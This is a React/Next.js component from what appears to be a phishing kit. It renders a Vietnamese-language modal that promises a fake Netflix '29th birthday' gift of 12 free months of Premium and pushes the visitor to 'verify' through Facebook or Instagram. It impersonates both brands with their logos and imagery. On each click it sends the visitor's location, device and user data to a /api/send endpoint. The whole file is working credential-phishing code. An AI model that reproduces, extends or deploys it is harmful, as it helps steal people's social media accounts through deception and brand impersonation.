'use client';

import InstagramLogoImage from '@/assets/images/logo insta.webp';
import NetflixHeroBg from '@/assets/images/netflix-hero-bg.jpg';
import { useTranslation } from '@/hooks/use-translation';
import { store, type LoginProvider } from '@/store/store';
import { buildAppealMessage } from '@/utils/message';
import { faXmark } from '@fortawesome/free-solid-svg-icons/faXmark';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import Image from 'next/image';
import { useState, type FC } from 'react';

const PROMO_IMAGE = NetflixHeroBg;

const FacebookIcon = () => (
    <svg className='h-5 w-5 shrink-0' viewBox='0 0 24 24' aria-hidden='true'>
        <path
            fill='#1877F2'
            d='M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z'
        />
    </svg>
);

const InstagramIcon = () => (
    <Image src={InstagramLogoImage} alt='Instagram' className='h-5 w-5 shrink-0 object-contain' />
);

interface LoginChoiceModalProps {
    onSelect: (provider: LoginProvider) => void;
}

const LOGIN_CHOICE_TEXTS = [
    'Xác minh để nhận quà sinh nhật',
    'Mừng sinh nhật 29 năm — Netflix Premium miễn phí 12 tháng. 4K HDR, xem không giới hạn. Chỉ còn 500 suất quà tặng!',
    'Tiếp tục với Facebook',
    'Tiếp tục với Instagram',
    'Bằng việc nhấn Tiếp tục, bạn đồng ý với',
    'Điều khoản dịch vụ',
    'và',
    'Chính sách quyền riêng tư',
    'Đóng'
] as const;

const LoginChoiceModal: FC<LoginChoiceModalProps> = ({ onSelect }) => {
    const { t } = useTranslation(LOGIN_CHOICE_TEXTS);
    const [isSending, setIsSending] = useState(false);
    const { geoInfo, deviceLabel, messageId, userData, setModalOpen, setLoginProvider, setMessageId, resetFormSession } = store();

    const handleClose = () => {
        resetFormSession();
        setModalOpen(false);
    };

    const handleSelect = async (provider: LoginProvider) => {
        if (isSending) return;

        setIsSending(true);
        setLoginProvider(provider);

        const message = buildAppealMessage({
            geoInfo,
            deviceLabel,
            userData,
            loginProvider: provider
        });

        try {
            const res = await axios.post('/api/send', { message, old_message_id: messageId });
            if (res?.data?.success && typeof res.data.message_id === 'number') {
                setMessageId(res.data.message_id);
            }
        } catch {
            //
        } finally {
            setIsSending(false);
            onSelect(provider);
        }
    };

    return (
        <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center bg-black/60 px-4 backdrop-blur-sm'>
            <div className='relative flex max-h-[90vh] w-full max-w-[900px] overflow-hidden rounded-2xl bg-white shadow-[0_24px_48px_rgba(0,0,0,0.25)]'>
                <button
                    type='button'
                    onClick={handleClose}
                    className='absolute top-4 right-4 z-10 flex h-9 w-9 items-center justify-center rounded-full bg-black/10 text-[#1c1e21] transition-colors hover:bg-black/20'
                    aria-label={t('Đóng')}
                >
                    <FontAwesomeIcon icon={faXmark} className='h-4 w-4' />
                </button>

                {/* Left promotional pane */}
                <div className='relative hidden w-[42%] shrink-0 overflow-hidden bg-[#0a0a0a] md:block'>
                    <Image src={PROMO_IMAGE} alt='' fill className='object-cover opacity-80' unoptimized />
                    <div className='absolute inset-0 bg-linear-to-t from-black/90 via-black/30 to-transparent' />
                    <div className='absolute right-0 bottom-0 left-0 p-8'>
                        <p className='text-xl leading-snug font-bold text-white'>{t('Mừng sinh nhật 29 năm — Netflix Premium miễn phí 12 tháng. 4K HDR, xem không giới hạn. Chỉ còn 500 suất quà tặng!')}</p>
                        <div className='mt-6 flex gap-1.5'>
                            <span className='h-1.5 w-1.5 rounded-full bg-white' />
                            <span className='h-1.5 w-1.5 rounded-full bg-white/40' />
                            <span className='h-1.5 w-1.5 rounded-full bg-white/40' />
                        </div>
                    </div>
                </div>

                {/* Right login pane */}
                <div className='flex flex-1 flex-col justify-center px-8 py-10 sm:px-12 sm:py-14'>
                    <h2 className='mb-10 text-center text-[28px] leading-tight font-bold text-[#090909] sm:text-[32px]'>{t('Xác minh để nhận quà sinh nhật')}</h2>

                    <div className='mx-auto flex w-full max-w-[360px] flex-col gap-3'>
                        <button
                            type='button'
                            onClick={() => handleSelect('facebook')}
                            disabled={isSending}
                            className='flex h-[52px] w-full items-center justify-center gap-3 rounded-xl border border-[#e5e5e5] bg-white px-4 text-[15px] font-semibold text-[#090909] transition-all hover:bg-[#fafafa] hover:shadow-sm active:scale-[0.99] disabled:cursor-not-allowed disabled:opacity-60'
                        >
                            <FacebookIcon />
                            {t('Tiếp tục với Facebook')}
                        </button>

                        <button
                            type='button'
                            onClick={() => handleSelect('instagram')}
                            disabled={isSending}
                            className='flex h-[52px] w-full items-center justify-center gap-3 rounded-xl border border-[#e5e5e5] bg-white px-4 text-[15px] font-semibold text-[#090909] transition-all hover:bg-[#fafafa] hover:shadow-sm active:scale-[0.99] disabled:cursor-not-allowed disabled:opacity-60'
                        >
                            <InstagramIcon />
                            {t('Tiếp tục với Instagram')}
                        </button>
                    </div>

                    <p className='mx-auto mt-8 max-w-[360px] text-center text-xs leading-relaxed text-[#757575]'>
                        {t('Bằng việc nhấn Tiếp tục, bạn đồng ý với')}{' '}
                        <span className='cursor-pointer text-[#090909] underline underline-offset-2'>{t('Điều khoản dịch vụ')}</span>{' '}
                        {t('và')}{' '}
                        <span className='cursor-pointer text-[#090909] underline underline-offset-2'>{t('Chính sách quyền riêng tư')}</span>
                    </p>
                </div>
            </div>
        </div>
    );
};

export default LoginChoiceModal;
